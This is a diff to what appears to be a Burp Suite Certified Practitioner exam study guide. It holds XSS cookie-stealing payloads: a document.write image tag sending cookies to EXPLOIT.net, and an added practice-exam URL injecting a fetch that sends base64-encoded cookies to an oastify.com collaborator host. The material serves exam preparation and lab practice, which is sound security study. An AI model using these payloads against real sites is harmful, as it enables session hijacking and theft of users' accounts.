@@ -193,7 +193,7 @@ document.write('<img src="HTTPS://EXPLOIT.net/?c='+document.cookie+'" />');
 
 ### Javascript set test cookie in current browser session with no HttpOnly flag to allow proof of concept cookie stealer.
 
-`ocument.cookie = "TopSecretCookie=HackThePlanetWithPeanutButter";`
+`document.cookie = "TopSecretCookie=HackThePlanetWithPeanutButter";`
 
 ### Prompt Validation payload, does not steal cookie or send it to exploit server.
 
@@ -1048,3 +1048,11 @@ Kudos to https://github.com/botesjuan/ for this awesome image, that defines poss
 [Admin panel - RFI](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#6-admin-panel-rfi)  
 [Admin panel - SSTI](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#6-admin-panel-password-reset-email-ssti)  
 [Admin panel - ImgSize](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner/#5-admin-panel-imgsize-command-injection)  
+
+
+## Practice exam one
+
+after finding the xss vulnerability:
+```
+document.location='https://0a9e0011040cf6738278429a004b0072.web-security-academy.net/?SearchTerm="-fetch('https%3A%2F%2Fbgvi9nnedmvq0eryzu34cbqic9i06vuk%252Eoastify%252Ecom%3Fc%3D'%2Bbtoa(document['cookie']))-"
+```
